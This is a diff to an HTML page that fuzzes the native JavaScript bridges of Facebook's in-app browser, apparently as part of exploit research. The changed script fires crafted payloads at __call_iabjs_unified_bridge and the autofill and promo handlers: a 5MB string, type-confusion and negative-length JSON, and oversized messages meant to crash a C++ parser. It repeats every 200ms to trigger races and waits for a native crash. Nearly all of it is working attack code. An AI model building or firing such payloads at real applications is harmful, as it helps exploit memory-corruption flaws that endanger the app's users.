@@ -1,65 +1,70 @@
 <!DOCTYPE html>
 <html>
-<head><title>JSI Shotgun Fuzzer</title></head>
-<body style="background:#111; color:#0f0;">
-    <h2>Fuzzing all injected interfaces...</h2>
+<head><title>JSI Precision Fuzzer</title></head>
+<body style="background:#000; color:#0f0;">
+    <h3>Precision Striking FB JSIs...</h3>
     <div id="log"></div>
 
     <script>
         const logEl = document.getElementById('log');
         function log(msg) { logEl.innerHTML += msg + "<br>"; }
 
-        // The malformed data we want to force into a C++ buffer
-        const giantString = "A".repeat(1024 * 1024); // 1MB string
-        const malformedJson = '{"cmd":"test", "data":' + giantString + '}';
+        // 1. The "Big String" for Buffer Overflows
+        const giantString = "A".repeat(1024 * 1024 * 5); // 5MB String to really stress the allocator
 
-        function shotgun() {
-            log("[*] Commencing Shotgun Fuzz...");
-
-            // 1. Attack common WebKit Message Handlers (iOS style, but sometimes present on Android)
-            try {
-                if (window.webkit && window.webkit.messageHandlers) {
-                    for (let handler in window.webkit.messageHandlers) {
-                        log("Firing at webkit handler: " + handler);
-                        window.webkit.messageHandlers[handler].postMessage(giantString);
-                        window.webkit.messageHandlers[handler].postMessage(malformedJson);
-                    }
-                }
-            } catch(e) {}
-
-            // 2. Attack ALL functions on the window object that aren't native browser functions
-            for (let prop in window) {
-                try {
-                    let obj = window[prop];
-                    if (typeof obj === 'function' && !obj.toString().includes('[native code]')) {
-                        // Found a custom injected function! Fire at will.
-                        log("Firing at global function: " + prop);
-                        obj(giantString);
-                        obj(malformedJson);
-                    } else if (typeof obj === 'object' && obj !== null && prop !== 'window' && prop !== 'document') {
-                         // Look inside objects (like window._FB_.doSomething)
-                         let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
-                         methods.forEach(m => {
-                             if (typeof obj[m] === 'function') {
-                                 log(`Firing at object method: ${prop}.${m}`);
-                                 obj[m](giantString);
-                                 obj[m](malformedJson);
-                             }
-                         });
-                    }
-                } catch(e) {}
-            }
+        // 2. Crafted IPC Messages
+        // We guess common Facebook IPC structures based on their open-source SDKs
+        const payloads = [
+            // Attempt to overflow a command parser
+            giantString,
             
-            log("[*] Volley complete.");
+            // Attempt Type Confusion (giving an array where a string is expected)
+            JSON.stringify({ "action": "test", "callback": [], "data": giantString }),
+            
+            // Attempt Integer Overflow in length calculations
+            JSON.stringify({ "action": "saveAutofill", "length": -1, "data": "A" }),
+            
+            // Send massive JSON to break the rapidjson parser in C++
+            JSON.stringify({ "cmd": "log", "msg": giantString }),
+            
+            // Attempt to trigger the native cache query we saw in Ghidra
+            JSON.stringify({ "action": "queryCache", "key": giantString })
+        ];
+
+        function strike() {
+            log("[*] Firing at __call_iabjs_unified_bridge...");
+            if (typeof window.__call_iabjs_unified_bridge === 'function') {
+                payloads.forEach(p => {
+                    try { window.__call_iabjs_unified_bridge(p); } catch(e) {}
+                    try { window.__call_iabjs_unified_bridge("test", p); } catch(e) {}
+                });
+            }
+
+            log("[*] Firing at iabjs_unified_bridge...");
+            if (window.iabjs_unified_bridge) {
+                // Brute force all methods on this object
+                let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.iabjs_unified_bridge));
+                methods.forEach(m => {
+                    if (typeof window.iabjs_unified_bridge[m] === 'function') {
+                        payloads.forEach(p => {
+                            try { window.iabjs_unified_bridge[m](p); } catch(e) {}
+                        });
+                    }
+                });
+            }
+
+            log("[*] Firing at Autofill/Promo...");
+            try { window._AutofillMessageHandler.postMessage(giantString); } catch(e) {}
+            try { window._PromoExtensions.postMessage(giantString); } catch(e) {}
+
+            log("[+] Volley complete. Waiting for native crash...");
         }
 
-        // Run the fuzzer immediately
-        shotgun();
+        // Fire immediately
+        strike();
 
-        // Optional: Trigger destruction to test for UAF if the buffer overflow fails
-        setTimeout(() => {
-            window.close(); 
-        }, 1000);
+        // Fire repeatedly to trigger race conditions
+        setInterval(strike, 200);
 
     </script>
 </body>
